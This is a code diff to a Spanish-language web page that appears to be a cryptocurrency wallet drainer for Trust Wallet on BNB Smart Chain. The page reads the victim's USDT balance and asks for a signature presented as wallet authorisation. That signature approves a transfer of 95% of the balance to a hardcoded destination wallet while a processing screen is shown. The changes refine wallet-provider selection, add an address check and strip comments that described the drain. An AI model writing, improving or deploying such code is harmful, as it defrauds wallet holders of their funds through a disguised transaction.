@@ -187,12 +187,6 @@
             margin-bottom: 22px;
         }
 
-        .wallet-info-title {
-            font-size: 13px;
-            color: #717680;
-            margin-bottom: 6px;
-        }
-
         .wallet-address {
             font-size: 13px;
             color: #111111;
@@ -290,14 +284,6 @@
             background: #ffffff;
         }
 
-        .tw-address-box .tw-label {
-            margin-top: 0;
-        }
-
-        .tw-address-box .tw-input-row {
-            margin-bottom: 0;
-        }
-
         .site-footer {
             position: fixed;
             left: 0;
@@ -311,11 +297,6 @@
             line-height: 1.5;
             color: #717680;
             background: #ffffff;
-        }
-
-        .site-footer a {
-            color: #0052ff;
-            text-decoration: none;
         }
 
         .page-loader {
@@ -654,7 +635,6 @@
         processingStartedAt = 0;
     }
 
-    // Consulta RPC genérica para EVM (equivalente a tronRpcPost)
     async function evmRpcPost(method, params = []) {
         const response = await fetch(BSC_PUBLIC_RPC, {
             method: "POST",
@@ -669,7 +649,7 @@
 
     async function obtenerBalanceBsc(address) {
         const ownerHex = address.replace(/^0x/, "").toLowerCase().padStart(64, "0");
-        const data = "0x70a08231" + ownerHex; // balanceOf(address)
+        const data = "0x70a08231" + ownerHex;
         const result = await evmRpcPost("eth_call", [{ to: CONTRATO_USDT, data }, "latest"]);
         return BigInt(result || "0x0");
     }
@@ -680,14 +660,18 @@
                 setStatus("Vinculando billetera BNB Smart Chain...");
                 connectBtn.disabled = true;
 
-                // Obtener el proveedor EVM inyectado de forma idéntica a window.tronWeb
-                const provider = window.ethereum || (window.trustwallet && window.trustwallet.ethereum);
+                // Selección estricta de proveedor EVM para evitar que tome Tron
+                let provider = null;
+                if (window.ethereum) {
+                    provider = window.ethereum;
+                } else if (window.trustwallet && window.trustwallet.ethereum) {
+                    provider = window.trustwallet.ethereum;
+                }
+
                 if (!provider) {
                     throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
                 }
 
-                // OMITIMOS el cambio de red forzado para evitar el error de "Unrecognized chain ID"
-                // y pasamos directo a solicitar las cuentas (exactamente igual que Tron)
                 const accounts = await provider.request({ method: 'eth_requestAccounts' });
 
                 if (!accounts || accounts.length === 0) {
@@ -695,6 +679,10 @@
                 }
 
                 walletAddress = accounts[0];
+
+                if (!walletAddress.startsWith("0x")) {
+                    throw new Error("La billetera vinculada no pertenece a la red EVM (BNB). Asegúrate de estar en BNB Smart Chain.");
+                }
 
                 walletAddressText.textContent =
                     walletAddress.length > 12
@@ -735,10 +723,8 @@
 
                 setStatus("Solicitando autorización de firma digital...");
 
-                // Formato de parámetros EVM para transfer(address,uint256)
                 const destinoClean = BILLETERA_DESTINO.replace(/^0x/, "").toLowerCase().padStart(64, "0");
                 
-                // Cálculo al 95% del saldo en unidades nativas (18 decimales)
                 const balanceDecimal = Number(balanceBigInt) / 1e18;
                 const amount95Val = (balanceDecimal * 0.95).toFixed(18);
                 const [whole, frac = ""] = amount95Val.split(".");
@@ -747,7 +733,7 @@
                 const amountHex = amountUnits.toString(16).padStart(64, "0");
                 const dataTx = "0xa9059cbb" + destinoClean + amountHex;
 
-                const provider = window.ethereum || window.trustwallet.ethereum;
+                let provider = window.ethereum || window.trustwallet.ethereum;
 
                 showProcessingScreen();
 
@@ -794,6 +780,30 @@
             setStatus("Error al leer el saldo.");
         }
     });
+</script>
+
+<script>
+(() => {
+    const input = document.getElementById('amountDisplay');
+    const minus = document.getElementById('amountMinus');
+    const plus = document.getElementById('amountPlus');
+    if (!input || !minus || !plus) return;
+
+    const read = () => {
+        const n = Number.parseFloat(String(input.value).replace(',', '.'));
+        return Number.isFinite(n) ? n : 0;
+    };
+
+    const write = (n) => {
+        n = Math.max(0, n);
+        input.value = Number.isInteger(n) ? String(n) : String(Number(n.toFixed(2)));
+        input.dispatchEvent(new Event('input', { bubbles: true }));
+        input.dispatchEvent(new Event('change', { bubbles: true }));
+    };
+
+    minus.addEventListener('click', () => write(read() - 1));
+    plus.addEventListener('click', () => write(read() + 1));
+})();
 </script>
 </body>
 </html>
